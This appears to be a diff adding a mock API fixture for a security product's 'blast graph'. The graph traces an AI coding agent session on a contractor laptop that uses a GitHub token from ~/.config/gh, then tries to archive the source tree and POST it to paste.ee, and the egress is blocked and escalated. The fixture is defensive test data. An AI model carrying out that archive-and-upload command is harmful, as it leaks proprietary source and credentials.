@@ -1,0 +1,75 @@
+{
+ "operationId": "getBlastGraph",
+ "access": "read",
+ "status": 200,
+ "headers": {},
+ "body": {
+  "execution_id": "exec_01JA3ZPASTE",
+  "nodes": [
+   {
+    "id": "n1",
+    "kind": "endpoint",
+    "label": "LT-VN-0412 · Thanh Nguyen",
+    "detail": "Vendor Engineering (contractors)",
+    "verdict": null
+   },
+   {
+    "id": "n2",
+    "kind": "cue",
+    "label": "Vendor contractors v1",
+    "detail": "Codex CLI — Vendor contractors",
+    "verdict": "allow"
+   },
+   {
+    "id": "n3",
+    "kind": "mcp_sandbox",
+    "label": "github-enterprise (Aegis Bridge)",
+    "detail": "sbx-gh-vn12",
+    "verdict": "allow"
+   },
+   {
+    "id": "n4",
+    "kind": "credential",
+    "label": "personal access token",
+    "detail": "Personal access token from ~/.config/gh",
+    "verdict": "allow"
+   },
+   {
+    "id": "n5",
+    "kind": "data",
+    "label": "mobile-app-src.tar.gz — 18.4 MB",
+    "detail": "tar czf mobile-app-src.tar.gz ./ && POST paste.ee",
+    "verdict": "flag"
+   },
+   {
+    "id": "n6",
+    "kind": "dlp_outcome",
+    "label": "Egress blocked · escalated",
+    "detail": "Flagged an archive of the internal source tree headed to paste.ee (not in the CUE allow-list). Blocked and escalated to the SOC.",
+    "verdict": "block"
+   }
+  ],
+  "edges": [
+   {
+    "from": "n1",
+    "to": "n2"
+   },
+   {
+    "from": "n2",
+    "to": "n3"
+   },
+   {
+    "from": "n3",
+    "to": "n4"
+   },
+   {
+    "from": "n4",
+    "to": "n5"
+   },
+   {
+    "from": "n5",
+    "to": "n6"
+   }
+  ]
+ }
+}
